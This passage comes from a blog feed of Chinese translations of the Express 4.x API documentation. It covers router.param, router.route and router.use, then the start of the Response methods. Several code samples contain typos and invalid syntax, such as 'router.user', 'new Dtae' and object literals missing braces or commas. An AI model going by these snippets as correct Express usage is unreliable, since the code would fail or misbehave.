class="keyword">else</span>&#123;</span><br><span class="line">            next(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'fail to load user'</span>))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;) </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>该回调方法是在本地路由器上定义他们，它们不是由加载的应用程序或路由器继承的。因此，定义在路由上的参数回调只有通过<code>router</code>定义的路由参数才会触发</p><p>一个回调参数将被称为一次请求响应周期，即使参数在多个路径中匹配，如下面的栗子所示：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.param(<span class="string">'id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,id</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'CALLED ONLY ONCE'</span>);</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/user/:id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'although this matchs '</span>);</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.get(<span class="string">'/user/:id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'and this matchs too '</span>);</span><br><span class="line">    res.end();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>将会依次打印：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">CAALED ONLY ONCE</span><br><span class="line">although <span class="keyword">this</span> matchs</span><br><span class="line">and <span class="keyword">this</span> matchs too</span><br></pre></td></tr></table></figure></p><blockquote><p>以下部分描述<code>router.param(callback)</code>在v4.11.0将是过时的</p></blockquote><p><code>router.param(name,callback)</code>方法的行为通过仅传递一个函数到<code>router.param()</code>将会完全改变。此功能是如何实现<code>router.param(name,callback)</code>的习惯-它接受两个参数，必须返回一个中间件</p><p>函数返回的中间件决定了URL参数被捕获时发生的行为</p><p>在下面这个例子中，<code>router.param(name,callback)</code>签名被修改为<code>router.param(name, accessId)</code>。<code>router.param()将会接受一个</code>name<code>和一个</code>number<code>而不是一个</code>name<code>和一个</code>回调函数`</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定制 `router.param()`的功能</span></span><br><span class="line">router.param(<span class="function"><span class="keyword">function</span>(<span class="params">param,option</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,val</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(val == option)&#123;</span><br><span class="line">            next();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.sendStatus(<span class="number">403</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用定制的`router.param()`</span></span><br><span class="line">router.param(<span class="string">'id'</span>,<span class="number">1337</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发捕获的路由</span></span><br><span class="line">router.get(<span class="string">'/user/:id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'OK'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.use(router);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Ready'</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>在这个栗子中，<code>router.param(name,callback)</code>签名是相同的，但不是一个中间件回调，一个自定义检查函数定义了验证用户ID<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">router.param(<span class="function"><span class="keyword">function</span>(<span class="params">param,validator</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,val</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(validator(val))&#123;</span><br><span class="line">            next();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.sendStatus(<span class="number">403</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.param(<span class="string">'id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">candidate</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="built_in">isNaN</span>(<span class="built_in">parseFloat</span>(candidate)) &amp;&amp; <span class="built_in">isFinite</span>(candidate)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="router-route-path"><a href="#router-route-path" class="headerlink" title="router.route(path)"></a>router.route(path)</h3><p>返回单个路由的实例，您可以使用可选中间件来处理HTTP verbs，使用<code>router.route()</code>为了避免重复路由命名，从而键入错误。</p><p>在上面<code>router.param()</code>栗子的基础上，下面的栗子展示了如何使用<code>router.route()</code>指定HTTP处理方法<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line">router.param(<span class="string">'user_id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next,id</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 示例用户，可能实际将从db等获取</span></span><br><span class="line">    req.user = &#123;</span><br><span class="line">        id:id,</span><br><span class="line">        name:<span class="string">'TJ'</span></span><br><span class="line">    &#125;;</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.route(<span class="string">'/users/:user_id'</span>)</span><br><span class="line">.all(<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">    next()</span><br><span class="line">&#125;)</span><br><span class="line">.get(<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    res.json(req.user)</span><br><span class="line">&#125;)</span><br><span class="line">.put(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    req.user.name = req.params.name;</span><br><span class="line">    <span class="comment">// 保存用户等</span></span><br><span class="line">    res.json(req.user) </span><br><span class="line">&#125;)</span><br><span class="line">.post(<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    next(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'not implemented'</span>));</span><br><span class="line">&#125;)</span><br><span class="line">.delete(<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    next(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'not implemented'</span>))</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>这个方法再利用单一<code>/users/:user_id</code>路径并且为各种HTTP方法添加处理程序</p><h3 id="router-use-path-function-…-function"><a href="#router-use-path-function-…-function" class="headerlink" title="router.use([path], [function, …] function)"></a>router.use([path], [function, …] function)</h3><p>使用指定中间件函数或者函数，可选的参数是挂载路径，默认是”/“</p><p>这个方法类似于<code>app.use()</code>。下面展示了一个简单的示例和用例：</p><p>中间件就像是管道，请求在第一个中间件函数定义时开始，并为它们”向下”匹配每一条路径处理中间件堆栈处理。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line">router.use(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'%s %s %s'</span>,req.method,req.url,req.path);</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面只有当路径从挂载点开始时，才会调用这个函数</span></span><br><span class="line">router.use(<span class="string">'/bar'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 总是调用</span></span><br><span class="line">router.use(<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'Hello world'</span>)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">'/foo'</span>,router);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>);</span><br></pre></td></tr></table></figure></p><p>“挂载”路径被剥离并且对中间件功能不可见。这个功能的主要作用是：不管它的”prefix前缀”路径，安装中间件功能可能没有代码的变化</p><p>为了保证您使用<code>router.use()</code>定义的中间件的重要性。他们按顺序调用，因此顺序定义中间件优先级。举个栗子：通常<code>logger</code>是您将使用的第一个中间件，因此每个请求都会被记录<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> logger = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</span><br><span class="line"></span><br><span class="line">router.user(logger());</span><br><span class="line">router.use(express.static(__dirname+<span class="string">'/public'</span>));</span><br><span class="line">router.use(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'hello'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>现在假设您忽略了对静态文件的日志请求,但是在<code>logger()</code>之后要继续记录路由和中间件定义。你只需简单的移动<code>express.static()</code>到顶部，在添加日志中间件之前即可。<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">router.use(express.static(__dirname + <span class="string">'/public'</span>));</span><br><span class="line">router.use(logger());</span><br><span class="line">router.use(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'Hello'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>另一个例子是从多个目录中服务文件，给予”/public”优先<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(express.static(__dirname + <span class="string">'/public'</span>));</span><br><span class="line">app.use(express.static(__dirname + <span class="string">'/files'</span>));</span><br><span class="line">app.use(express.static(__dirname + <span class="string">'/uploads'</span>));</span><br></pre></td></tr></table></figure></p><p><code>router.use()</code>方法也支持命名参数，这样，其他路由器的挂载点可以通过使用命名参数预加载来获益。</p><blockquote><p>NOTE:虽然这些中间件功能是通过特定路由器添加的,当他们运行时由他们连接到的路径来定义(而不是路由)。因此，如果路由器的路由匹配，则通过一个路由器添加的中间件可以运行其他路由器。举个栗子，下面显示安装在同一路径上的两个不同的路由器：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> autoRouter = express.Router();</span><br><span class="line"><span class="keyword">var</span> openRouter = express.Router();</span><br><span class="line"></span><br><span class="line">autoRouter.use(<span class="built_in">require</span>(<span class="string">'./authenticate'</span>).basic(usersdb));</span><br><span class="line"></span><br><span class="line">autoRouter.get(<span class="string">'/:user_id/edit'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// .. 编辑用户界面 .. </span></span><br><span class="line">&#125;)</span><br><span class="line">openRouter.get(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// .. 用户列表 ..</span></span><br><span class="line">&#125;)</span><br><span class="line">openRouter.get(<span class="string">'/:user_id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// .. 查看用户 .. </span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">'/users'</span>,authRouter);</span><br><span class="line">app.use(<span class="string">'/users'</span>,openRouter);</span><br></pre></td></tr></table></figure></p></blockquote><p>尽管<code>authenticate</code>中间件是通过<code>autoRouter</code>路由加入的,但是它也将运行在openRouter定义的路由上，因为两个路由器都挂载在<code>/users</code>。为了避免这种行为发生，为每个路由器使用不同的路径。</p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>Express文档中Router部分就完成了，本人学识有限，难免有所纰漏或者理解不当之处，翻译仅仅是方便个人学习交流使用，无其他用意，原文地址：<a href="http://www.expressjs.com.cn/4x/api.html#res" target="_blank" rel="noopener">expressjs.com</a></p>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
            <tag> express </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Express4.x API (三)：Response (译)</title>
      <link href="/2017/12/21/express-api-cn-response/"/>
      <url>/2017/12/21/express-api-cn-response/</url>
      
        <content type="html"><![CDATA[<h1 id="Express4-x-API-译文-系列文章"><a href="#Express4-x-API-译文-系列文章" class="headerlink" title="Express4.x API 译文 系列文章"></a>Express4.x API 译文 系列文章</h1><ul><li><a href="http://www.cnblogs.com/okaychen/p/8108405.html" target="_blank" rel="noopener">Express4.x API (一)：application (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8081275.html" target="_blank" rel="noopener">Express4.x API (二)：request (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8087425.html" target="_blank" rel="noopener">Express4.x API (三)：Response (译) – 完成</a></li><li><a href="http://www.cnblogs.com/okaychen/p/8093717.html" target="_blank" rel="noopener">Express4.x API (四)：router (译) – 完成</a></li></ul><a id="more"></a><h1 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h1><p><code>res</code>对象表示一个Express应用程序在收到HTTP请求时发送的HTTP响应(response)</p><p>在这篇文档和惯例中，HTTP响应这个对象总是被称为<code>res</code>(HTTP请求则是req)，但是它的实际名称取决于您正在工作的回调函数的参数.</p><p>举个栗子：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/user/:id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.send(<span class="string">'user'</span> + req.params.id)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>当然你也可以这样：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/user/:id'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">request,response</span>)</span>&#123;</span><br><span class="line">    response.send(<span class="string">'user'</span> + request.params.id)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><h3 id="res-app"><a href="#res-app" class="headerlink" title="res.app"></a>res.app</h3><p>此属性持有对使用中间件Express应用实例的引用</p><p><code>res.app</code>和在request对象中的<code>req.app</code>属性是完全相同的</p><h3 id="res-headersSent"><a href="#res-headersSent" class="headerlink" title="res.headersSent"></a>res.headersSent</h3><p>布尔属性，表示这个app是否发送了HTTP头进行响应<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.get(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res.headersSend);  <span class="comment">// false</span></span><br><span class="line">    res.send(<span class="string">'ok'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(res.headersSend); <span class="comment">// true</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="res-locals"><a href="#res-locals" class="headerlink" title="res.locals"></a>res.locals</h3><p>一个对象包含局部变量作用域的请求的响应，因此只能用于在request/response周期中呈现的视图(如果有的话)。否者，此属性与app.locals是相同的</p><p>此属性用于公开<code>request-level</code>信息，例如请求的路径名(path name)，经过身份认证的用户(authenticated user),用户设置(user setting)等等<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">app.use(<span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line">    res.locals.user = req.user;</span><br><span class="line">    req.locals.authenticated = !req.user.anonymous;</span><br><span class="line">    next();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h2 id="Methods"><a href="#Methods" class="headerlink" title="Methods"></a>Methods</h2><h3 id="res-append-field-value"><a href="#res-append-field-value" class="headerlink" title="res.append(field[,value])"></a>res.append(field[,value])</h3><blockquote><p>res.append在Expressv4.11.0+是支持的</p></blockquote><p>将指定的值到http响应头字段.如果header还没有被设置，它创建具有指定值的头文件，<code>value</code>参数可以是字符串或数组</p><p>如果<code>res.set()</code>在<code>res.append()</code>之后的话将会重置以前设置的header头</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.append(<span class="string">'Link'</span>,[<span class="string">'&lt;http://localhost/&gt;'</span>,<span class="string">'&lt;http://localhost:3000/&gt;'</span>])</span><br><span class="line">res.append(<span class="string">'Set-Cookie'</span>,<span class="string">'foo=bar;path=/;HttpOnly'</span>)</span><br><span class="line">res.append(<span class="string">'Warning'</span>,<span class="string">'199 Miscellaneous warning'</span>)</span><br></pre></td></tr></table></figure><h3 id="res-attachment-filename"><a href="#res-attachment-filename" class="headerlink" title="res.attachment([filename])"></a>res.attachment([filename])</h3><p>使用<code>attchment</code>设置HTTP响应<code>Content-Dispositon</code>头字段.如果给了一个文件名<code>filename</code>，然后基于扩展名通过<code>res.type()</code>设置<code>Content-Type</code>,并设置<code>Content-Disposition</code>“fliename=”参数<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.attachment();</span><br><span class="line"><span class="comment">// Content-Disposition:attachment</span></span><br><span class="line"></span><br><span class="line">res.attachment(<span class="string">'path/to/logo.png'</span>);</span><br><span class="line"><span class="comment">// Content-Disposition:attachment;filename='logo.png'</span></span><br><span class="line"><span class="comment">// Content-Type:image/png</span></span><br></pre></td></tr></table></figure></p><h3 id="res-cookie-name-value-options"><a href="#res-cookie-name-value-options" class="headerlink" title="res.cookie(name,value[,options])"></a>res.cookie(name,value[,options])</h3><p>给cookie名称设置值，<code>value</code>参数可以是一个字符串或者是对象转化为JSON，options参数可以是具有以下属性的对象</p><table><thead><tr><th>Property</th><th>Type</th><th>Description</th></tr></thead><tbody><tr><td>domain</td><td>String</td><td>cookie的域名，默认应用程序的域名</td></tr><tr><td>expires</td><td>Date</td><td>格林尼治时间内cookie的到期日期，如果没有指明或设置为0，创建会话cookie</td></tr><tr><td>httpOnly</td><td>Boolean</td><td>标志cookie只能由web服务器访问</td></tr><tr><td>maxAge</td><td>String</td><td>在毫秒内设置相对于当前时间的方便选项</td></tr><tr><td>path</td><td>String</td><td>cookie的路径，默认为’/‘</td></tr><tr><td>secure</td><td>Boolean</td><td>标记只于https一起使用的cookie</td></tr><tr><td>signed</td><td>Boolean</td><td>指示cookie是否被签署</td></tr></tbody></table><blockquote><p>提供带有选项设置的HTTP <code>Set-Cookie`</code>res.cookie`起作用，未指定的任何选项默认值为<a href="http://tools.ietf.org/html/rfc6265" target="_blank" rel="noopener">RFC 6265</a></p></blockquote><p>举个栗子：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.cookie(<span class="string">'name'</span>,<span class="string">'tobi'</span>,&#123;<span class="attr">domain</span>:<span class="string">'example.com'</span>,<span class="attr">path</span>:<span class="string">'/admin'</span>,<span class="attr">secure</span>:<span class="literal">true</span>&#125;);</span><br><span class="line">res.cookie(<span class="string">'rememberme'</span>,<span class="string">'1'</span>,&#123;<span class="attr">expires</span>:<span class="string">'new Dtae(Date.now() + 900000),httpOnly：true'</span>&#125;)</span><br></pre></td></tr></table></figure></p><p><code>maxAge</code>选项是以当前时间为起点以毫秒为单位设置<code>expires</code>的便捷选项，下面这个栗子相当于上面例子中的第二个<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.cookie(<span class="string">'rememberme'</span>,<span class="string">'1'</span>,&#123;<span class="attr">maxAge</span>:<span class="number">900000</span>,<span class="attr">httpOnly</span>:<span class="literal">true</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>你可以传递一个对象给<code>value</code>参数,然后通过<code>bodyparser</code>中间件将其序列化为JSON<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.cookie(<span class="string">'cart'</span>,&#123;<span class="attr">items</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]&#125;)</span><br><span class="line">res.cookie(<span class="string">'cart'</span>,&#123;<span class="attr">items</span>:[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]&#125;,&#123;<span class="attr">maxAge</span>:<span class="number">900000</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>当使用<code>cookie-parser</code>中间件时，此方法还支持签署cookie，只需要设置<code>signed</code>选项为true。然后<code>res.cookie()</code>将会秘密的传递给<code>cookieParser(secret)</code>去签署这个值<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.cookie(<span class="string">'name'</span>,<span class="string">'tobi'</span>,&#123;<span class="attr">signed</span>:<span class="literal">true</span>&#125;)</span><br></pre></td></tr></table></figure></p><p>然后你可以通过<code>req.signedCookie()</code>访问此值</p><h3 id="res-clearCookie-name-options"><a href="#res-clearCookie-name-options" class="headerlink" title="res.clearCookie(name,[,options])"></a>res.clearCookie(name,[,options])</h3><p>通过cookie名称清除指定的cookie<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.cookie(<span class="string">'rememberme'</span>,<span class="string">'tobi'</span>,&#123;<span class="attr">path</span>:<span class="string">'/admin'</span>&#125;);</span><br><span class="line">res.clearCookie(<span class="string">'rememberme'</span>,&#123;<span class="attr">path</span>:<span class="string">'/admin'</span>&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="res-download-path-fliename-fn"><a href="#res-download-path-fliename-fn" class="headerlink" title="res.download(path,[,fliename][,fn])"></a>res.download(path,[,fliename][,fn])</h3><p>将路径中文件作为<code>附件(attachment)</code>传输.通常，浏览器将提示用户下载.默认情况下，<code>Content-Disposition</code>头中”filename=”参数是路径（这通常出现在浏览器对话框），用<code>filename</code>参数覆盖默认值<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.download(<span class="string">'/report-12345.pdf'</span>);</span><br><span class="line"></span><br><span class="line">res.download(<span class="string">'/report-12345.pdf'</span>,<span class="string">'report.pdf'</span>);</span><br><span class="line"></span><br><span class="line">res.download(<span class="string">'/report-12345.pdf'</span>,<span class="string">'report.pdf'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="comment">// 处理错误，但是请记得响应可能是部分发送的</span></span><br><span class="line">        <span class="comment">// 所以检查`res.headerssent`</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 减量下载，等</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="res-end-data-encoding"><a href="#res-end-data-encoding" class="headerlink" title="res.end([data][,encoding])"></a>res.end([data][,encoding])</h3><p>结束响应进程，This method actually comes from Node core, specifically the <a href="https://nodejs.org/api/http.html#http_response_end_data_encoding_callback" target="_blank" rel="noopener">response.end() method of http.ServerResponse</a>.（这句话翻译过来我有些不理解，我就不再翻译，res.end用于结束响应）</p><p>快速结束响应而无需任何数据，如果你需要对数据进行响应，取而代之的是使用诸如<code>res.send</code>和<code>res.json</code><br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.send();</span><br><span class="line">res.status(<span class="number">404</span>).end();</span><br></pre></td></tr></table></figure></p><h3 id="res-format-object"><a href="#res-format-object" class="headerlink" title="res.format(object)"></a>res.format(object)</h3><p>在请求对象时，在<code>Accept</code>HTTP头对象上执行<code>content-negotiation</code>。他使用<code>req.accepts</code>基于可接受的质量值的有序类型为请求选择一个处理程序，如果header未指定，调用第一个回调函数.当没有找到匹配项，服务器响应406<code>Not Acceptable</code>或调用默认回调函数</p><p>当选择回调时，将设置<code>Content-Type</code>响应头.然而你可以使用回调方法在回调中更改此值例如：<code>res.set</code>或者<code>res.type</code></p><p>下面这个例子当<code>Accept</code>头域设置为<code>applocation/json</code>或者<code>*/json</code>时，将会响应{‘message’:’hey’}(然而如果是”<em>/</em>“,响应将会是’hey’)<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.format(&#123;</span><br><span class="line">    <span class="string">'text/plain'</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        res.send(<span class="string">'hey'</span>)</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">'text/html'</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        res.send(<span class="string">'&lt;p&gt;hey&lt;/p&gt;'</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="string">'applaction/json'</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        res.send(message:<span class="string">'hey'</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="string">'default'</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// 记录请求并用406响应</span></span><br><span class="line">        res.status(<span class="number">406</span>).send(<span class="string">'Not Acceptable'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>除了规范化MOME类型，对于稍微不太详细的实现你还可以使用扩展名映射到这些类型<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.format(&#123;</span><br><span class="line">    text:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        res.send(<span class="string">'hey'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    html:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        res.send(<span class="string">'&lt;p&gt;hey&lt;/p&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    json:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        res.send(&#123;<span class="attr">message</span>:<span class="string">'hey'</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="res-get-field"><a href="#res-get-field" class="headerlink" title="res.get(field)"></a>res.get(field)</h3><p>返回由路由字段指定的http响应头(对大小写是不敏感的)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.get(<span class="string">'Content-Tpye'</span>);  <span class="comment">// =&gt; 'text/plain'</span></span><br></pre></td></tr></table></figure><h3 id="res-json-body"><a href="#res-json-body" class="headerlink" title="res.json([body])"></a>res.json([body])</h3><p>发送一个JSON响应，这个方法和<code>res.send</code>是一样的传递一个对象或者数组作为参数.但是你可以使用它将其他值转化为JSON,例如null，undefined（虽然这些在技术上不是有效的JSON）<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.json(<span class="literal">null</span>)</span><br><span class="line">res.json(user:<span class="string">'tobi'</span>)</span><br><span class="line">res.status(<span class="number">500</span>).json(error:<span class="string">'message'</span>)</span><br></pre></td></tr></table></figure></p><h3 id="res-jsonp-body"><a href="#res-jsonp-body" class="headerlink" title="res.jsonp([body])"></a>res.jsonp([body])</h3><p>发送一个JSONP支持的JSON响应，这个方法和<code>req.json()</code>是相同的,除了他选择在JSONP的回调支持<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.jsonp(<span class="literal">null</span>) <span class="comment">// =&gt; null</span></span><br><span class="line"></span><br><span class="line">res.jsonp(&#123;<span class="attr">user</span>:<span class="string">'tobi'</span>&#125;)  <span class="comment">// =&gt; &#123;"user":"tobi"&#125;</span></span><br><span class="line"></span><br><span class="line">res.status(<span class="number">500</span>).jsonp(&#123;<span class="attr">error</span>:<span class="string">'message'</span>&#125;)  <span class="comment">// =&gt; &#123;"error":"message"&#125;</span></span><br></pre></td></tr></table></figure></p><p>以下是一些JSONP响应用相同的代码的栗子：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ?callback=foo</span></span><br><span class="line">res.jsonp(user:<span class="string">"tobi"</span>)  <span class="comment">// =&gt; foo(&#123;"user":"tobi"&#125;)</span></span><br><span class="line"></span><br><span class="line">app.set(<span class="string">'JSONP callback name '</span>,<span class="string">'cb'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?cb=foo</span></span><br><span class="line">res.status(<span class="number">500</span>).jsonp(&#123;<span class="attr">error</span>:<span class="string">'message'</span>&#125;)  <span class="comment">// =&gt; foo(&#123;"error":"message"&#125;)</span></span><br></pre></td></tr></table></figure></p><h3 id="res-links-links"><a href="#res-links-links" class="headerlink" title="res.links(links)"></a>res.links(links)</h3><p>将提供的链接作为参数的属性添加到响应的<code>Link</code> HTTP 头字段<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">res.links(&#123;</span><br><span class="line">    next:<span class="string">'http://api.example.com/user?page=2'</span>,</span><br><span class="line">    last:<span class="string">'http://api.example.com/user?page=5'</span></span><br><span 